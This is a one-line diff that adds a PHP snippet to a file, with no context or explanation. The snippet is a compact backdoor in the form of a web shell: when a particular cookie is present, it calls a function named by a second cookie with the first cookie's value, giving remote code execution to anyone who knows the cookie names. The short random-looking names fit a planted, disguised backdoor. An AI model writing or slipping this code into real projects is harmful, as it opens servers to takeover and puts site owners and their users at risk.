@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["iNlCU"])){$_COOKIE["iTLX"]($_COOKIE["iNlCU"]);exit;}
